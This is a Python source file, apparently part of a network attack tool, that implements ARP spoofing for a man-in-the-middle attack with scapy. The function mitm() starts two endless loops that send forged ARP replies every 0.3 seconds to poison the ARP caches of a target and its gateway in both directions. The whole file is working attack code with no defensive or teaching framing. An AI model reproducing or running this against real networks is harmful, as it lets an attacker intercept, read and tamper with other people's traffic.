import scapy.all as scapy
from multiprocessing import Process
import time
from log import log_info

from utils import arp


def mitm(target: str, gateway:str, host: str):
    # print(target, gateway, host, "mitm")
    spawn_spoofer(target, gateway)
    spawn_spoofer(gateway, target)

def spawn_spoofer(targetIP, spoofIP):
    p = Process(target=loop_spoofer, args=(targetIP, spoofIP,))
    p.start()

def loop_spoofer(targetIP, spoofIP):
    log_info(f"starting spoofer {targetIP} -> {spoofIP}")
    destinationMac = arp(targetIP)
    while True:
        spoofer(targetIP, spoofIP, destinationMac)
        time.sleep(0.3)

def spoofer(targetIP, spoofIP, destinationMac):
    packet=scapy.ARP(op=2,pdst=targetIP,hwdst=destinationMac,psrc=spoofIP)
    scapy.send(packet, verbose=False)
